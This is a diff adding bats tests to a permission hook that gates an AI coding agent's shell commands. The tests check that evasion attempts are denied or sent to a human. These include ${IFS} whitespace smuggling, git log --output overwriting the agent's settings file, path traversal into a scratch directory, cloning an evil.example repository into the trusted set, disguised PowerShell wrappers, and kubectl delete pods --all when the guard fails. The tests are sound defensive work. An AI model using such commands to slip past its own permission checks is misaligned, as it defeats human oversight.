@@ -102,6 +102,16 @@ setup() {
     [[ "$output" == *"Command substitution"* ]]
 }
 
+@test "ask: parameter expansion cannot smuggle whitespace past mutation rules" {
+    seed_real_project_config
+
+    run_hook 'ws review${IFS}reply${IFS}yggdrasil${IFS}129${IFS}thread${IFS}body'
+
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
+    [[ "$output" == *"parameter expansion"* ]]
+}
+
 @test "deny: > triggers redirection message" {
     run_hook "echo hi > /tmp/file"
     [ "$status" -eq 0 ]
@@ -351,6 +361,25 @@ JSON
     [[ "$output" == *"Git execution modifier"* ]]
 }
 
+@test "security: git output option denies before a log allow" {
+    write_project_hook_rules ""
+    write_project_settings 'Bash(git log:*)'
+
+    run_hook "git log --output=.claude/settings.local.json --format=attacker"
+
+    [[ "$output" == *'"permissionDecision":"deny"'* ]]
+    [[ "$output" == *"Git execution modifier"* ]]
+}
+
+@test "security: bats allow cannot traverse from tests into scratch" {
+    seed_real_project_config
+
+    run_hook "bash tests/vendor/bats-core/bin/bats tests/../.tmp/evil.bats"
+
+    [[ "$output" == *'"permissionDecision":"ask"'* ]]
+    [[ "$output" == *"contained under tests"* ]]
+}
+
 @test "security: git diff continuation does not allow git difftool" {
     write_project_hook_rules ""
     write_project_settings 'Bash(git diff:*)'
@@ -373,6 +402,14 @@ JSON
     seed_real_project_config
 
     run_hook "ws realm use --trust realm-community"
+
+    [[ "$output" == *'"permissionDecision":"ask"'* ]]
+}
+
+@test "ask: adding an arbitrary clone to the trusted ecosystem lands on a human" {
+    seed_real_project_config
+
+    run_hook "ws clone --url https://evil.example/pwn.git --name pwn --add-eco"
 
     [[ "$output" == *'"permissionDecision":"ask"'* ]]
 }
@@ -1535,6 +1572,39 @@ EOF
     [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
 }
 
+@test "powershell: scratch-hosted test wrapper does not use the carve-out" {
+    seed_real_project_config
+    mkdir -p "$WORK/.tmp"
+
+    run_hook_ps "Set-Location $WORK/.tmp; ./test.ps1" "" "$WORK"
+
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
+    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
+}
+
+@test "powershell: dot segments cannot disguise a scratch-hosted wrapper" {
+    seed_real_project_config
+    mkdir -p "$WORK/.tmp"
+
+    run_hook_ps "Set-Location $WORK/./.tmp; ./test.ps1" "" "$WORK"
+
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
+    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
+}
+
+@test "powershell: persisted scratch cwd does not make test wrapper trusted" {
+    seed_real_project_config
+    mkdir -p "$WORK/.tmp"
+
+    run_hook_ps "./test.ps1" "" "$WORK/.tmp"
+
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
+    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
+}
+
 @test "powershell: cd prefix + backslash invocation allows" {
     run_hook_ps "cd D:/Dev/GitWS/yggdrasil/components/mimir; .\\test.ps1"
     [ "$status" -eq 0 ]
@@ -1622,6 +1692,42 @@ seed_k8s_scope() {  # $1=session_id, $2=context, $3=namespaces
 GDD_K8S_CONTEXT=$2
 GDD_K8S_NAMESPACES=$3
 EOF
+}
+
+@test "k8s floor: a missing shared guard forces a human decision" {
+    seed_real_project_config
+    write_project_settings 'Bash(kubectl *)'
+    local isolated_root="$BATS_TEST_TMPDIR/missing-guard"
+    mkdir -p "$isolated_root/.claude/hooks"
+    cp "$REPO_ROOT/.claude/hooks/gdd-permission-hook.sh" "$isolated_root/.claude/hooks/gdd-permission-hook.sh"
+    HOOK_BIN="$isolated_root/.claude/hooks/gdd-permission-hook.sh"
+
+    run_hook "kubectl delete pods --all"
+
+    [ "$status" -eq 0 ]
+    [[ "$output" == *'"permissionDecision":"ask"'* ]]
+    [[ "$output" == *"guard is unavailable"* ]]
+}
+
+@test "k8s floor: a guard evaluation error forces a human decision" {
+    seed_real_project_config
+    write_project_settings 'Bash(kubectl *)'
+    local isolated_root="$BATS_TEST_TMPDIR/broken-guard"
+    mkdir -p "$isolated_root/.claude/hooks" "$isolated_root/scripts"
+    cp "$REPO_ROOT/.claude/hooks/gdd-permission-hook.sh" "$isolated_root/.claude/hooks/gdd-permission-hook.sh"
+    cat > "$isolated_root/scripts/ws-k8s-guard.sh" <<'BASH'
+k8s_guard_normalize_command() { printf '%s' "$1"; }
+k8s_guard_script_path() { return 1; }
+k8s_guard_inline_shell_contains_kubectl() { return 1; }
+k8s_guard_evaluate() { return 1; }
+BASH
+    HOOK_BIN="$isolated_root/.claude/hooks/gdd-permission-hook.sh"
+
+    run_hook "kubectl delete pods --all"
+
+    [ "$status" -eq 0 ]
+    [[ "$output" == *'"permissionDecision":"ask"'* ]]
+    [[ "$output" == *"guard evaluation failed"* ]]
 }
 
 @test "scoped-redirect: active non-k8s entry does not abort when k8s floor is disabled" {
